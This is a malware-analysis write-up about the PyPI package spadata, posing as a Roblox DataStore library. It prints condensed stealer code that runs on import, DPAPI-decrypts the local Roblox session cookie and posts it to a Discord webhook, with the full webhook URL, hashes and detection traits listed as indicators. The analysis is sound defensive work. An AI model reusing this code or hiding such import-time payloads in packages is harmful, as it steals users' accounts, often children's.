---
title: "spadata: Gimme All Your Roblox — a bogus PyPI \"DataStore\" library that decrypts your Roblox cookie the moment you import it"
date: 2026-06-03
summary: "`spadata@0.1.1` is a PyPI package that claims to be a Python library for Roblox DataStore — a thing that cannot exist, since DataStore is a server-side Luau API you call from inside Roblox Studio. There is no DataStore code in it; the payload lives in `__init__.py`, which auto-runs on `import spadata`, so the theft fires before the victim calls anything. It copies Roblox's local cookie store `robloxcookies.dat`, base64-decodes the `CookiesData` field, and calls `win32crypt.CryptUnprotectData` to DPAPI-decrypt it itself — so the cleartext `.ROBLOSECURITY` session leaves the host, not ciphertext — then posts it to a hardcoded Discord webhook. No persistence, no second stage, no obfuscation beyond a try/except: a low-effort, Russian-commented Roblox account stealer aimed at young scripters who don't know the cover story is nonsense."
packageName: spadata
ecosystem: PyPI
---

<img src="/assets/images/spadata-roblox-stickup-meme.jpg" alt="Meme: a kitten with its paws up at gunpoint — 'GIMME ALL YOUR ROBLOX PLZ.' spadata mugs the victim for exactly one thing: their Roblox session cookie." style="width: 60%; height: auto;">

Most PyPI stealers at least pretend to be a tool you'd actually use. `spadata` bills itself as a Python library for Roblox DataStore — a thing that can't exist, because DataStore is a server-side Luau API you call from inside Roblox Studio, never from Python. The disguise isn't built to fool an engineer; it's built to fool a kid who scripts Roblox and went looking for a shortcut. There's no DataStore code in the package at all — `import spadata` runs one function that finds the local Roblox cookie, decrypts it, and hands it to a Discord webhook. The README can't even keep the lie straight, misspelling the package as «spaysdata» in its own description. The meme is the spec: walk up to a Roblox player, point, and ask for everything. And it makes you do the work — nobody runs anything, the import is the stickup.

Traits below are from cleave `2.0.0-rc.4` (traits `126f8e4b2`); the wheel was unpacked and read statically, nothing was imported.

## Package metadata

| Field | Value |
| --- | --- |
| Package | `spadata` (PyPI) |
| Version | `0.1.1` |
| Summary | `Библиотека для работы с DataStore в Roblox` |
| Description | `Custom Python library for Roblox DataStore.` |
| Requires-Python | `>=3.8` |
| Dependencies | `requests`; `pywin32; sys_platform == "win32"` |
| Console script | `spadata-run = spadata.main:retrieve_roblox_cookies` |
| Build | `setuptools 82.0.1`, `py3-none-any` |
| Top-level module | `spadata` |
| Install vector | import-time auto-run in `__init__.py` |
| Exfil | hardcoded Discord webhook |

## Stage 1 — \_\_init\_\_.py: the import is the trigger

The wheel ships two files, and the dangerous one runs before you call anything. Its `__init__.py` invokes the stealer at module scope inside a bare try/except, so the grab fires the instant Python initialises the package and any error vanishes silently. There is nothing to call — `import spadata` is the whole trigger. The operator annotates the move in Russian, a comment promising the code «выполнится АВТОМАТИЧЕСКИ» as soon as the package loads. The declared `spadata-run` console script is set dressing: the import that registered it already pulled the trigger. The try/except earns its keep on portability too, quietly eating the `win32crypt` import error that aborts the payload on anything but Windows. cleave reads the Cyrillic only as a non-ASCII-ratio spike — the tell that the author and the mark don't share a first language.

<pre class="lang-py"><code><span class="tok-com"># spadata/__init__.py — import is the trigger</span>
<span class="tok-kw">from</span> .main <span class="tok-kw">import</span> retrieve_roblox_cookies
<span class="tok-kw">try</span>:
    <span class="tok-fn">retrieve_roblox_cookies</span>()       <span class="tok-com"># «выполнится АВТОМАТИЧЕСКИ» — runs on import</span>
<span class="tok-kw">except</span> Exception <span class="tok-kw">as</span> e:
    <span class="tok-fn">print</span>(e)
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/data/control-flow/module-exec::try-wrapped-module-call` | Import-time call to `retrieve_roblox_cookies()` silenced by try/except |
| <span class="sev-dot notable" title="notable"></span> | `objectives/anti-static/obfuscation/code-metrics/source::high-non-ascii-ratio` | Russian comments push `text.non_ascii_ratio` past the 0.4 threshold |

## Stage 2 — main.py: grab, decrypt, post

`main.py` does its one job in a straight line, no obfuscation anywhere. It copies Roblox's local cookie store, `robloxcookies.dat`, into the temp directory under a fresh name. From that copy it reads the base64 `CookiesData` field and decodes it. Roblox keeps that blob DPAPI-encrypted, so the code calls `win32crypt.CryptUnprotectData` on it itself — the thief unlocks the loot before taking it. What ships out is the cleartext `.ROBLOSECURITY` session, not ciphertext, and the channel is a Discord webhook hardcoded in plaintext at the top of the file. It captions the theft, too: one request reading `Decrypted Content:` and a second carrying the cookie. That cookie is the whole account — replayed in a browser it walks past the password and 2FA, which for a Roblox player is the Robux, the inventory, and the resale value in one string.

<pre class="lang-py"><code><span class="tok-com"># spadata/main.py — grab, decrypt, post (condensed)</span>
webhook = <span class="tok-str">"https://discord.com/api/webhooks/1501511921185325186/0-lN4d-…"</span>
src = os.path.<span class="tok-fn">join</span>(USERPROFILE, <span class="tok-str">"AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"</span>)
shutil.<span class="tok-fn">copy</span>(src, os.path.<span class="tok-fn">join</span>(TEMP, <span class="tok-str">"RobloxCookies.dat"</span>))
encoded = json.<span class="tok-fn">load</span>(<span class="tok-fn">open</span>(dst))[<span class="tok-str">"CookiesData"</span>]
clear = win32crypt.<span class="tok-fn">CryptUnprotectData</span>(base64.<span class="tok-fn">b64decode</span>(encoded), <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-kw">None</span>, <span class="tok-num">0</span>)[<span class="tok-num">1</span>]
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: <span class="tok-str">"Decrypted Content:"</span>})
requests.<span class="tok-fn">post</span>(webhook, json={<span class="tok-str">"content"</span>: clear.<span class="tok-fn">decode</span>(<span class="tok-str">"utf-8"</span>, errors=<span class="tok-str">"ignore"</span>)})
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/platform::roblox-cookie-source` | Reads Roblox's local cookie store `robloxcookies.dat` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/exfiltration/stealer/credential/dpapi::dpapi-webhook-stealer` | DPAPI-decrypted secret posted to a Discord webhook |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/channel/messaging::discord-webhook-url` | Hardcoded `discord.com/api/webhooks/...` URL |
| <span class="sev-dot notable" title="notable"></span> | `objectives/credential-access/browser/dpapi::python-dpapi-unprotect` | `win32crypt.CryptUnprotectData` on the base64-decoded blob |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/fs/path/sensitive/credentials::roblox-cookie-file` | Path ends in `LocalStorage/robloxcookies.dat` |

## A stickup, not a heist

Strip the costume and there's almost nothing here: no persistence, no second stage, no anti-analysis past a try/except, and a webhook anyone can report and burn. What makes `spadata` worth a write-up isn't sophistication — it's the targeting. A library that claims to help you store data in Roblox instead takes your Roblox, aimed squarely at scripters too new to know that a Python DataStore library is a contradiction in terms. The whole chain is one import and three HTTP calls, and it still works, because the mark was never going to read `__init__.py`. The cat in the meme has its paws up; the gun is a `pip install`.

## Indicators

| Type | Value |
| --- | --- |
| Package | `spadata@0.1.1` (PyPI) |
| Wheel | `spadata-0.1.1-py3-none-any.whl` |
| Wheel SHA-256 | `d6bd7475105b0c2b561870a1c1f1b16bdbe811867340a1ebbc995db8f7fc2bff` |
| `main.py` SHA-256 | `cafc8dc7fb047e6a59826974a0921f5c45022bb77a85af8502e1a5105eb3a1c8` |
| `__init__.py` SHA-256 | `44788ac7ba1cb54093f6edf2382da25047564417ef4223ff94c110116c83c90c` |
| Declared summary | `Библиотека для работы с DataStore в Roblox` |
| Console script | `spadata-run = spadata.main:retrieve_roblox_cookies` |
| Dependencies | `requests`, `pywin32` (Windows only) |
| Trigger | `import spadata` → `__init__.py` auto-runs `retrieve_roblox_cookies()` |
| Cookie source | `%USERPROFILE%\AppData\Local\Roblox\LocalStorage\robloxcookies.dat` |
| Temp copy | `%TEMP%\RobloxCookies.dat` |
| Decryption | `win32crypt.CryptUnprotectData` (DPAPI) on base64 `CookiesData` |
| Target secret | Roblox `.ROBLOSECURITY` session cookie |
| Exfil | `https://discord.com/api/webhooks/1501511921185325186/0-lN4d-dYtJXAI0Wzf_ay225eK_DzM3Prp8-uTh4CVVt-1gDPJHG0SEZL7Pe9GCAQcOT` |
| Classification | Roblox session-cookie stealer (Discord webhook exfil) |
</content>
